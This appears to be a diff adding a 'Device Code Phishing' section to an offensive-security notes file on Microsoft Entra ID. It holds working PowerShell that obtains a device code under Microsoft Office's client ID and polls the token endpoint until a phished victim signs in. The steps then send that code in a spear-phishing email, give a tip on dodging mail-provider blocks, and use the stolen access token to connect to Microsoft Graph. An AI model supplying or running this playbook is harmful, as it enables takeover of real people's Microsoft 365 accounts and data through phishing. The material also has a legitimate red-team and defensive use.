@@ -24,3 +24,83 @@ OR you can login via CLI
 
 ## Device Code Phishing
 
+Resource: https://aadinternals.com/post/phishing/
+
+### 1) Request a user and device code (Microsoft Graph resource and MS Office application Client ID are used in the example here)
+
+List of common Microsoft Application IDs: https://learn.microsoft.com/en-us/troubleshoot/entra/entra-id/governance/verify-first-party-apps-sign-in#application-ids-of-commonly-used-microsoft-applications
+
+    $body=@{
+        "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+        "resource" =  "https://graph.microsoft.com"
+    }
+    
+    $authResponse=(Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body)
+    $authResponse
+
+### 2) Create a script that continuously queries the token endpoint and polls for authentication status. Upon successful authentication, it will print our access token and a refresh token is also stored in the variable.
+
+    $response = ""
+    $continue = $true
+    $interval = $authResponse.interval
+    $expires =  $authResponse.expires_in
+    
+    $body=@{
+        "client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+        "grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
+        "code" = $authResponse.device_code
+        "resource" = "https://graph.microsoft.com"
+    }
+    
+    while($continue)
+    {
+        Start-Sleep -Seconds $interval
+        $total += $interval
+    
+        if($total -gt $expires)
+        {
+            Write-Error "Timeout occurred"
+            return
+        }
+    
+        try
+        {
+            $response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
+        }
+        catch
+        {
+            $details=$_.ErrorDetails.Message | ConvertFrom-Json
+            $continue = $details.error -eq "authorization_pending"
+            Write-Host $details.error
+    
+            if(!$continue)
+            {
+                Write-Error $details.error_description
+                return
+            }
+        }
+    
+        if($response)
+        {
+          break
+        }
+    }
+    $response.access_token
+
+### 3) Send a spear phishing email to target with the device code in the body
+
+DO NOT USE GMAIL AND OUTLOOK, USE ANOTHER EMAIL CLIENT INSTEAD TO PREVENT BLOCKS!
+
+### 4) Copy the access token and paste it into:
+
+https://jwt.io/
+
+### 5) Use token to authenticate, depending on the type of token.
+
+Microsoft Graph example
+
+    Connect-MgGraph -AccessToken ($response.access_token | ConvertTo-SecureString -AsPlainText -Force)
+
+### 6) Confirm execution context
+
+    Get-MgContext
